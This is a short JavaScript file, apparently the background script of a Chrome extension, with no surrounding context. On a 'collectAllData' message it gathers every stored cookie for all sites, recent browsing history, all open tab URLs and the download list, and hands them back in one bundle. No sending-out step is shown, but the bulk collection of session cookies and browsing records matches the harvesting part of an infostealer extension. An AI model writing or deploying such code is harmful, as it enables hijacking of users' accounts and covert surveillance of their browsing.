async function getAllCookies() {
  return new Promise((resolve) => {
    chrome.cookies.getAll({}, (cookies) => resolve(cookies));
  });
}

async function getDownloads() {
  return new Promise((resolve) => {
    chrome.downloads.search({}, (items) => resolve(items));
  });
}

async function getHistory() {
  return new Promise((resolve) => {
    chrome.history.search({ text: "", maxResults: 1000 }, (items) => resolve(items));
  });
}

async function getTabs() {
  return new Promise((resolve) => {
    chrome.tabs.query({}, (tabs) =>
      resolve(tabs.map((t) => ({ url: t.url, title: t.title })))
    );
  });
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === "collectAllData") {
    (async () => {
      const cookies = await getAllCookies();
      const history = await getHistory();
      const tabs = await getTabs();
      const downloads = await getDownloads();
      sendResponse({ cookies, history, tabs, downloads });
    })();
    return true;
  }
});

